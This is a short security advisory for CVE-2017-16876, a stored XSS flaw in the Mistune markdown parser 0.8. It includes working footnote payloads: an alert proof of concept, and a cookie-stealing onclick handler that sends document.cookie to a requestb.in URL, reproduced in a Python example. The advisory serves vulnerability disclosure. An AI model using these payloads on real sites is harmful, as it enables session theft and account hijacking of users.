# Mistune
## Stored XSS vulnerability in the \_keyify function


|  |  |
|---|---|
| **Vulnerability** | Stored XSS vulnerability in the \_keyify function | 
| **Vendor** | Lepture |
| **Product** | Mistune - The fastest markdown parser in pure Python with renderer features, inspired by marked. - https://github.com/lepture/mistune/ |
| **Vulnerable version** | 0.8 |
| **Fixed version** | 0.8.1 |
| **CVE** | CVE-2017-16876 |
| **CVSS Score** | 6.1 Medium |
| **CVSS Vector** | 3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |


## References
* https://mistune.readthedocs.io/en/v0.8.4/
* https://nvd.nist.gov/vuln/detail/CVE-2017-16876

## Description

### Alert proof of concept:
```
Footnote 1 link[^first" onclick="alert(1)].
[^first" onclick="alert(1)]: Footnot
```

### Cookie exfiltration:
```
Footnote 1 link[^first" onclick="window.location.href='https://requestb.in/pmppk9pm?www='+escape(document.cookie)].
[^first" onclick="window.location.href='https://requestb.in/pmppk9pm?www='+escape(document.cookie)]: Footnot
```

Python example:
```python
import mistune
renderer = mistune.Renderer(escape=True, hard_wrap=True)
markdown = mistune.Markdown(renderer=renderer)
print('Works good:', markdown('[asd](qwe"onmouseover=")'))
xss = "Footnote 1 link[^first\" onclick=\"window.location.href='https://requestb.in/qqmmvkqq?www='+escape(document.cookie)].\n[^first\" onclick=\"window.location.href='https://requestb.in/qqmmvkqq?www='+escape(document.cookie)]: Footnot"
print('XSS:', markdown(xss))
```